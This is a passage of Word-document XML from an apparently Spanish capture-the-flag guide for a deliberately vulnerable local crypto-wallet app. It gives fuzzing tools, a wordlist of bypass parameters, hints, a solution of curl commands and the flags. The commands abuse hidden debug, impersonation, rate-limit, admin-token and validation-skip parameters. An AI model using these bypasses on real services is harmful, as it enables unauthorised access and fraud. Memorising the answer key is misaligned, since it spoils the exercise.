            <w:r>
              <w:t>cualquiera no vacio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Modo debug global</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>internal_user=admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>"internal mode" + bypass admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>feature_flags=admin_panel,debug</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>csv</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Habilita admin_panel y debug</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Herramientas Recomendadas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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Herramienta</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Uso</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>arjun -u &lt;URL&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Detectar query params validos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>arjun -u &lt;URL&gt; --get</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Idem GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>arjun -u &lt;URL&gt; -m POST -d '{}' --headers 'Content-Type: application/json'</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Detectar body JSON params</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Param Miner</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> (Burp)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Detectar headers ocultos por reflejo de respuesta</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>ffuf -H "FUZZ: 1"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Brute de header names</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>ffuf -b "FUZZ=1"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Brute de cookie names</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>x8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Param mining alternativo (Rust)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>kiterunner</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Brute de body params en POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>wfuzz</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Multi-payload fuzzing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Wordlists</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SecLists/Discovery/Web-Content/burp-parameter-names.txt    (~6.500 nombres)</w:t>
        <w:br/>
        <w:t>SecLists/Fuzzing/special-chars.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/api/api-parameters.txt</w:t>
        <w:br/>
        <w:t>PortSwigger/param-miner default wordlist</w:t>
        <w:br/>
        <w:t>assetnote/wordlists/data/automated/parameters.txt</w:t>
        <w:br/>
        <w:t>wordlists/cryptovulnx-magic-params.txt    (incluido)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wordlists/cryptovulnx-magic-params.txt</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>debug</w:t>
        <w:br/>
        <w:t>debug_mode</w:t>
        <w:br/>
        <w:t>debug_token</w:t>
        <w:br/>
        <w:t>include</w:t>
        <w:br/>
        <w:t>fields</w:t>
        <w:br/>
        <w:t>fields_filter</w:t>
        <w:br/>
        <w:t>expand</w:t>
        <w:br/>
        <w:t>embed</w:t>
        <w:br/>
        <w:t>verbose</w:t>
        <w:br/>
        <w:t>trace</w:t>
        <w:br/>
        <w:t>test</w:t>
        <w:br/>
        <w:t>dev</w:t>
        <w:br/>
        <w:t>sandbox</w:t>
        <w:br/>
        <w:t>admin</w:t>
        <w:br/>
        <w:t>as_user</w:t>
        <w:br/>
        <w:t>as_user_id</w:t>
        <w:br/>
        <w:t>impersonate</w:t>
        <w:br/>
        <w:t>bypass</w:t>
        <w:br/>
        <w:t>bypass_auth</w:t>
        <w:br/>
        <w:t>bypass_kyc</w:t>
        <w:br/>
        <w:t>bypass_rate_limit</w:t>
        <w:br/>
        <w:t>bypass_validation</w:t>
        <w:br/>
        <w:t>skip_validation</w:t>
        <w:br/>
        <w:t>skip_auth</w:t>
        <w:br/>
        <w:t>skip_kyc</w:t>
        <w:br/>
        <w:t>fee_override</w:t>
        <w:br/>
        <w:t>rate_override</w:t>
        <w:br/>
        <w:t>amount_override</w:t>
        <w:br/>
        <w:t>balance_override</w:t>
        <w:br/>
        <w:t>internal</w:t>
        <w:br/>
        <w:t>internal_user</w:t>
        <w:br/>
        <w:t>service_token</w:t>
        <w:br/>
        <w:t>admin_token</w:t>
        <w:br/>
        <w:t>master_key</w:t>
        <w:br/>
        <w:t>api_version</w:t>
        <w:br/>
        <w:t>feature_flags</w:t>
        <w:br/>
        <w:t>flags</w:t>
        <w:br/>
        <w:t>mock</w:t>
        <w:br/>
        <w:t>fake</w:t>
        <w:br/>
        <w:t>preview</w:t>
        <w:br/>
        <w:t>draft</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 1 - Empezar por arjun en endpoints conocidos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TARGET=http://localhost:8080</w:t>
        <w:br/>
        <w:t>TOKEN="&lt;jwt-de-login&gt;"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Detectar query params en wallets/balance</w:t>
        <w:br/>
        <w:t>arjun -u "$TARGET/api/v1/wallets/balance.php?wallet_id=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      --headers "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -w wordlists/cryptovulnx-magic-params.txt</w:t>
        <w:br/>
        <w:br/>
        <w:t># Esperado: arjun reporta debug, include, fields, as_user_id como validos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 2 - Mirar el header X-Magic-Signals</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -is "$TARGET/api/v1/wallets/balance.php?wallet_id=1&amp;debug=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Authorization: Bearer $TOKEN" | head -20</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Si la respuesta tiene </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Magic-Signals: 2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, el endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>respondio</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a 2 magic flags. Eso es la pista de que tus params/headers fueron interpretados.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 3 - Header fuzzing con Param Miner</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En Burp Suite:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Click derecho en request -&gt; Extensions -&gt; Param Miner -&gt; Guess headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Esperar - reportara </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Debug-Token</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Forwarded-For</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Original-URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Api-Version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Service-Token</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Admin-Token</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Bypass-RateLimit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Sin Burp, con ffuf:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Brute de nombres de header con valor "1"</w:t>
        <w:br/>
        <w:t>ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "FUZZ: 1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -u "$TARGET/api/v1/wallets/balance.php?wallet_id=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -mr "X-Magic-Signals|_debug|_magic" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -t 30</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 4 - Body params en POST con arjun</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Detectar body params en transfer</w:t>
        <w:br/>
        <w:t>arjun -u "$TARGET/api/v1/wallets/transfer.php" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -m POST -d '{"from_wallet_id":1,"to_wallet_address":"0x","amount":1}' \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      --headers "Content-Type: application/json,Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -w wordlists/cryptovulnx-magic-params.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 5 - Cookie fuzzing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ffuf -w wordlists/cryptovulnx-magic-params.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -b "FUZZ=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -u "$TARGET/api/v1/wallets/balance.php?wallet_id=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -mr "X-Magic-Signals|_debug" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -t 30</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 6 - Combinar magic flags para obtener admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Sin token, intentar acceder a /api/v1/admin/users.php</w:t>
        <w:br/>
        <w:t># Combinando: X-Admin-Token + Cookie internal_user=admin + XFF interno</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/admin/users.php" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Admin-Token: admin_dev_bypass_v1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Forwarded-For: 10.0.0.5" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Cookie: internal_user=admin"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion Resumida</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TARGET=http://localhost:8080</w:t>
        <w:br/>
        <w:t>TOK=$(curl -s -X POST $TARGET/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        -d '{"username":"carlos","password":"carlos2024"}' | jq -r .token)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 1. Query params - debug + include</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/wallets/balance.php?wallet_id=1&amp;debug=1&amp;include=*" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Authorization: Bearer $TOK" | jq</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2. Impersonacion via as_user_id</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/wallets/balance.php?as_user_id=4" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Authorization: Bearer $TOK" | jq '.wallets'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3. Bypass rate limit en login (5 fallidos antes)</w:t>
        <w:br/>
        <w:t>for i in {1..6}; do curl -sX POST $TARGET/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'; done</w:t>
        <w:br/>
        <w:t># El intento 6 sera 429. Ahora con bypass:</w:t>
        <w:br/>
        <w:t>curl -sX POST "$TARGET/api/v1/auth/login.php?bypass_rate_limit=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 4. Header magico - X-Forwarded-For + X-Admin-Token</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/v1/admin/users.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Admin-Token: admin_dev_bypass_v1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Forwarded-For: 127.0.0.1" | jq '.users[0]'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 5. Body param - skip_validation en transfer</w:t>
        <w:br/>
        <w:t>curl -sX POST $TARGET/api/v1/wallets/transfer.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Authorization: Bearer $TOK" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -d '{"from_wallet_id":1,"to_wallet_address":"0xMARIA0003-BTC-VULNX","amount":99999,"skip_validation":true}'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 6. Body param - rate_override en swap</w:t>
        <w:br/>
        <w:t>curl -sX POST $TARGET/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Authorization: Bearer $TOK" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -d '{"from_currency":"USDT","to_currency":"BTC","amount":1,"rate_override":999999}'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 7. Cookie - internal_user=admin</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/v1/admin/users.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Cookie: internal_user=admin" | jq '.total_users'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Flags</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FLAG-PARAM-01  -&gt; ?debug=1 expone SQL en wallets/balance</w:t>
        <w:br/>
        <w:t>FLAG-PARAM-02  -&gt; rate_limit bypass en login</w:t>
        <w:br/>
        <w:t>FLAG-PARAM-03  -&gt; ?fields=* dump de columnas</w:t>
        <w:br/>
        <w:t>FLAG-PARAM-04  -&gt; body params ocultos en transfer</w:t>
        <w:br/>
        <w:t>FLAG-PARAM-05  -&gt; body params ocultos en swap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
